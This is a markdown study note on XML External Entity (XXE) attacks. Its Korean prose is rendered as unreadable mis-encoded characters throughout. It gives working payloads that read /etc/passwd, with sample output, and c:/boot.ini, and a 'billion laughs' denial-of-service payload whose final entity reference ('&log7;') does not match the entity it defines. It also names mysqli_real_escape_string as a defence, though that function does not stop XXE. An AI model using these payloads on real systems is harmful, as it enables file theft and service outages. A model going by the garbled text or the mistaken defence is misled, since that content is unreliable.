# XML External Entity - XXE

![](../img/XXE-processing.png)

<br>

## π XXE?

XML eXternal Entityμ μ€μλ§λ‘ XML νμμ λ°μ΄ν° μμ²­μ μ μ‘ν  λ XML Parserκ° XMLμ μΈλΆμν°ν°λ₯Ό μ²λ¦¬ν  μ μκ² μ€μ λμ΄ μλ κ²½μ° λ°μνλ μ·¨μ½μ μ΄λ€.

SYSTEM ν€μλλ‘ XML νμλ₯Ό λ°μνκ² νλ©΄ νμ΄μ§μ λ΄μ©μ λμ²΄νλ κΆνμ΄ μκΈ°κ³  κ³΅κ²©μλ XML νμλ‘ μλ² μμ€νμ μ κ·Όν  μ μμ΅λλ€.

<br>

## XML κ΅¬μ‘°

xmlμ μ²«μ€μ <<xml>xml> νκ·Έλ₯Ό μ΄μ©νμ¬ xml λ¬Έμμμ λͺμν΄μΌ ν©λλ€.

```xml
<?xml version="1.0" encoding="UTF-8"?>
```

λ€μμλ XML λ¬Έμμ νλλ§ μ‘΄μ¬νλ λ£¨νΈ(root) μμλ₯Ό μμ±ν©λλ€.

```xml
<!DOCTYPE root []>
```

μΈλΆ μν°ν° μ μΈ λ°©λ²μλλ€.

```xml
<!ENTITY xxe SYSTEM "~~~">
&xxe;
```

<br>

## π© Offensive techniques

μΈλΆ μν°ν°λ₯Ό μ μΈνμ¬ SYSTEM ν€μλλ‘ xml νμλ₯Ό λ°μμμΌ μλ² μμ€νμ΄ μ κ·Όνκ² ν©λλ€.

Linux

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

&xxe;

>>>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
```

Windows

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]>
```

Dos κ³΅κ²©μ μΌμΌν¬ μλ μλλ° xmlμ½λλ‘ μΌμΌν€λ Dosλ XDos λΌκ³ λ λΆλ¦°λ€.

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">]>

&log7;

>>>
lollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollol ...
```

LFI, RFI, Injection λ±λ± μ¨κ° μ·¨μ½μ μ΄ λ°μλ  μ°λ €κ° μλ€. κΈ°λ³Έμ μΌλ‘ νν°λ§ λ° λ³΄νΈκΈ°λ²μ΄ μλ€λ κ°μ  νμ κ·Έλ₯ μμ²λΌ μλνλ€κ³  μκ°νλ©΄ λ©λλ€.

<br>

## π Denfensive techniques

XML λ¬Έμλ μΈλΆ ν΄λΌμ΄μΈνΈμ ν΅μ ν  μ μλλ‘ λ§λ€μ΄μ‘κΈ° λλ¬Έμ νΉμ  κ°μ²΄λ§ λΆλ¬μ€μ§ μλλ‘ μ€μ νλ κ²μ μ΄λ ΅λ€. λ°λΌμ XMLνμλ μμ€ν λ΄λΆμ DTDλ§μ μ°Έμ‘°νλλ‘ νκ³  XMLλ΄λΆμ μ μΈλ DTDλ νμ©νμ§ μλλ‘ μ€μ ν΄μΌ νλ€. μ¦ μ λ’°ν  μ μλ μΈλΆμ DTDλ νμ©νμ§ μκ³  μμ νκ² κ΅¬μ±λ λ΄λΆμ DTDλ§μ μ¬μ©ν΄μΌ νλ€. μ λ’°ν  μ μλ λ΄λΆ DTDμ μν°ν°λ₯Ό ν΅ν΄ μ°Έμ‘°ν  μΈλΆ κ°μ²΄λ₯Ό μ ννλ κ²μ΄λ€.

mysqli_real_escape_string ν¨μλ₯Ό μ΄μ©ν΄μ "NULL, \r, \n, \, ", '" μμ \λ₯Ό λΆνμ XMLμ½λλ₯Ό μΌλ°λ¬Έμλ‘ λ³κ²½ν©λλ€.

<br>

## π‘ etc

### xml νμλ?

μμ© νλ‘κ·Έλ¨μ΄ XML λ¬Έμλ₯Ό μ½μ μ μλλ‘ μΈν°νμ΄μ€λ₯Ό μ κ³΅ν΄μ£Όλ λΌμ΄λΈλ¬λ¦¬λ ν¨ν€μ§λ₯Ό μλ―Έν©λλ€.

XML νμμ μ΅μ’ λͺ©μ μ XML λ¬Έμλ₯Ό μμ© νλ‘κ·Έλ¨μ΄ μ½μ μ μλ μ½λλ‘ λ³ννλ κ²μλλ€.

### DTDλ?

Document Type Definition λλ λ¬Έμ νμ μ μλΌ λΆλ¦¬λ©° XML λ¬Έμμ κ΅¬μ‘° λ° ν΄λΉ λ¬Έμμμ μ¬μ©ν  μ μλ μ λ²ν μμμ μμ±μ μ μνλ€. 

DTDλ μν°ν°λ₯Ό μ μν  μ μμΌλ©°, λΉ λ₯Έ κ°λ°μ μν λ΄λΆ DTDλ₯Ό μ¬μ©ν  μ μλ€.

DTDλ μμ λΆν° μ¬μ©ν΄ μ¨ κ΅¬μ λ°©λ²μ΄μ§λ§, νΉμ μ μ₯μ μ λ°νμΌλ‘ μμ§λ λλ¦¬ μ¬μ©λκ³  μλ€.

μ΄λ¬ν DTDλ XML λ¬Έμ λ΄λΆμ λͺμν  μλ μμΌλ©°, λ³λμ νμΌλ‘ λΆλ¦¬ν  μλ μλ€.

<br>

## Reference

https://bibimnews.com/entry/XML-%EC%99%B8%EB%B6%80-%EA%B0%9C%EC%B2%B4XML-External-Entity-XXE-%EC%B7%A8%EC%95%BD%EC%A0%90-OWASP-Top-10-2017-A4

https://portswigger.net/web-security/xxe

https://inpa.tistory.com/entry/XML-%F0%9F%93%91-XML-%EA%B8%B0%EC%B4%88-%EC%A0%95%EB%A6%AC

http://www.tcpschool.com/xml/xml_basic_document